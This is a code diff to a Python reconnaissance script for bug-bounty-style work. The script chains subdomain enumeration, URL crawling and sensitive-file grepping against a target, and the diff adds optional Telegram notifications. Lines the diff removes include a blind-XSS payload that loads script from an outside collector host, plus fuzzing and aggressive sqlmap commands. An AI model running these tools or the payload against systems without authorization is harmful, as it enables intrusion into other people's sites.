@@ -69,6 +69,7 @@ def send_telegram_message(message):
         try:
             response = requests.post(url, data=data)
             response.raise_for_status()
+            logging.info(f"{random_color()}[*] Telegram message sent successfully.")
         except requests.RequestException as e:
             logging.error(f"{random_color()}Error sending Telegram message: {e}")
     else:
@@ -93,7 +94,7 @@ def send_telegram_file(file_path, caption):
     else:
         logging.error(f"{random_color()}Telegram bot token or chat ID is not configured.")
 
-def run_command(command, tool_name, target, output_file=None, report_message=None):
+def run_command(command, tool_name, target, output_file=None, report_message=None, notify_telegram=False):
     logging.info(f"{random_color()}[*] Running {tool_name}")
 
     try:
@@ -102,12 +103,12 @@ def run_command(command, tool_name, target, output_file=None, report_message=Non
             with open(output_file, 'wb') as f:
                 f.write(result.stdout)
             logging.info(f"{random_color()}[*] {tool_name} completed successfully")
-            if report_message:
+            if report_message and notify_telegram:
                 send_telegram_message(report_message)
-            if os.path.exists(output_file):
+            if os.path.exists(output_file) and notify_telegram:
                 send_telegram_file(output_file, f"{tool_name} results for {target}")
             else:
-                logging.error(f"{random_color()}Output file '{output_file}' not found.")
+                logging.info(f"{random_color()}Output file '{output_file}' does not exist or notifications are disabled.")
         else:
             logging.info(f"{random_color()}[*] {tool_name} completed successfully without output file.")
     except subprocess.CalledProcessError as e:
@@ -116,62 +117,48 @@ def run_command(command, tool_name, target, output_file=None, report_message=Non
         logging.info("Process was interrupted by the user.")
         sys.exit(1)
 
-def enum_subdomains(target, target_dir):
+def enum_subdomains(target, target_dir, notify_telegram):
     logging.info(f"{random_color()}[*] Enumerating subdomains")
     run_command(f"subfinder -d {target} -all -recursive", "Subfinder", target,
                 output_file=f"{target_dir}/{target}-subdomain.txt",
-                report_message=f"Subdomain enumeration for {target} completed.")
+                report_message=f"Subdomain enumeration for {target} completed." if notify_telegram else None,
+                notify_telegram=notify_telegram)
 
-    run_command(f"cat {target_dir}/{target}-subdomain.txt | httpx-toolkit -ports 80,8080,8000,8888 -threads 200", "Httpx Toolkit", target,
+    run_command(f"assetfinder -subs-only {target}", "Assetfinder", target,
+                output_file=f"{target_dir}/{target}-assetfinder.txt",
+                report_message=f"Assetfinder for {target} completed." if notify_telegram else None,
+                notify_telegram=notify_telegram)
+
+    run_command(f"findomain --target {target} --output", "Findomain", target,
+                output_file=f"{target_dir}/{target}-findomain.txt",
+                report_message=f"Findomain for {target} completed." if notify_telegram else None,
+                notify_telegram=notify_telegram)
+
+    run_command(f"cat {target_dir}/{target}-subdomain.txt {target_dir}/{target}-assetfinder.txt | httpx-toolkit -ports 80,8080,8000,8888 -threads 200", "Httpx Toolkit", target,
                 output_file=f"{target_dir}/{target}-subdomains_alive.txt",
-                report_message=f"Subdomain alive check for {target} completed.")
+                report_message=f"Subdomain alive check for {target} completed." if notify_telegram else None,
+                notify_telegram=notify_telegram)
 
     run_command(f"katana -u {target_dir}/{target}-subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {target_dir}/{target}-allurls.txt", "Katana", target,
                 output_file=f"{target_dir}/{target}-allurls.txt",
-                report_message=f"URL extraction for {target} completed.")
+                report_message=f"URL extraction for {target} completed." if notify_telegram else None,
+                notify_telegram=notify_telegram)
 
     run_command(f"cat {target_dir}/{target}-allurls.txt | grep -E '\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config|\\.js$' >> {target_dir}/{target}-sensitive.txt", "Sensitive File Extraction", target,
                 output_file=f"{target_dir}/{target}-sensitive.txt",
-                report_message=f"Sensitive file extraction for {target} completed.")
+                report_message=f"Sensitive file extraction for {target} completed." if notify_telegram else None,
+                notify_telegram=notify_telegram)
 
-def fuzzing(target, target_dir):
-    logging.info(f"{random_color()}[*] Fuzzing directories and files")
-    run_command(f"dirsearch -u https://{target}/ -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -o {target_dir}/dirsearch-{target}.txt", "Dirsearch", target,
-                output_file=f"{target_dir}/dirsearch-{target}.txt",
-                report_message=f"Directory and file fuzzing for {target} completed.")
-
-    run_command(f"ffuf -u https://{target}/ -w /usr/share/wordlists/dirb/common.txt  | anew > {target_dir}/{target}-ffuf.txt","ffuf",target,
-                output_file=f"{target_dir}/{target}-ffuf.txt",
-                report_message=f"ffuf is {target} completed")
-
-def xss_finding(target, target_dir):
-    logging.info(f"{random_color()}[*] Finding XSS vulnerabilities")
-    run_command(f"subfinder -d {target} | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\'><script src=https://xss.report/c/coffinxp></script>' -parameters", "XSS Finding", target,
-                output_file=f"{target_dir}/xss-results.txt",
-                report_message=f"XSS vulnerability finding for {target} completed.")
-
-def lfi_finding(target, target_dir):
-    logging.info(f"{random_color()}[*] Finding LFI vulnerabilities")
-    run_command(f"cat {target_dir}/{target}-allurls.txt | gf lfi | nuclei -tags lfi", "LFI Finding", target,
-                output_file=f"{target_dir}/lfi-results.txt",
-                report_message=f"LFI vulnerability finding for {target} completed.")
-
-# Commented out for future feature additions
-# def nuclei_scan(target, target_dir):
-#     logging.info(f"{random_color()}[*] Scanning for vulnerabilities with Nuclei")
-#     run_command(f"nuclei -list {target_dir}/{target}-subdomains_alive.txt -tags cve,osint,tech", "Nuclei Scan", target,
-#                 output_file=f"{target_dir}/nuclei-results.txt",
-#                 report_message=f"Nuclei scan for {target} completed.")
-
-# Commented out for future feature additions
-# def sql_injection(target, target_dir):
-#     logging.info(f"{random_color()}[*] Scanning for SQL injection")
-#     run_command(f"cat {target_dir}/{target}-allurls.txt | gau | urldedupe | gf sqli", "SQL Injection Generation", target,
-#                 output_file=f"{target_dir}/sql.txt",
-#                 report_message=f"SQL injection target generation for {target} completed.")
-#     run_command(f"sqlmap -m {target_dir}/sql.txt --batch --risk=3 --level=5", "SQLMap Scan", target,
-#                 output_file=f"{target_dir}/sqlmap-results.txt",
-#                 report_message=f"SQL injection scanning for {target} completed.")
+def print_banner(target, ip_address):
+    banner = f"""
+{Fore.GREEN}-------------------------------------------------
+{Fore.YELLOW}          WELCOME TO RECON TOOL
+{Fore.GREEN}-------------------------------------------------
+{Fore.CYAN}Target: {Fore.WHITE}{target}
+{Fore.CYAN}IP Address: {Fore.WHITE}{ip_address}
+{Fore.GREEN}-------------------------------------------------
+    """
+    logging.info(banner)
 
 def main():
     parser = argparse.ArgumentParser(description="Recon tool for enumeration and vulnerability scanning.")
@@ -180,9 +167,15 @@ def main():
 
     target = args.target
     target_dir = create_target_directory(target)
+    ip_address = get_ip_address(target)
+
+    if ip_address:
+        print_banner(target, ip_address)
+    else:
+        logging.warning(f"{random_color()}Unable to determine IP address for target '{target}'.")
 
     # Check if required tools are installed
-    required_tools = ["subfinder", "httpx-toolkit", "katana", "dirsearch", "gf", "nuclei", "sqlmap"]
+    required_tools = ["subfinder", "httpx-toolkit", "katana", "assetfinder", "findomain"]
     for tool in required_tools:
         if not check_tool(tool):
             logging.error(f"{random_color()}Tool '{tool}' not found. Please install it before running the script.")
@@ -195,13 +188,11 @@ def main():
         # If not configured, ask user for Telegram configuration
         prompt_for_config()
 
+    # Ask user if they want to notify via Telegram
+    notify_telegram = input("Do you want to notify results on Telegram? (y/n): ").strip().lower() == 'y'
+
     # Run tools
-    enum_subdomains(target, target_dir)
-    fuzzing(target, target_dir)
-    xss_finding(target, target_dir)
-    lfi_finding(target, target_dir)
-    # nuclei_scan(target, target_dir)  # Uncomment to enable Nuclei scanning
-    # sql_injection(target, target_dir)  # Uncomment to enable SQL Injection scanning
+    enum_subdomains(target, target_dir, notify_telegram)
 
 if __name__ == "__main__":
     main()
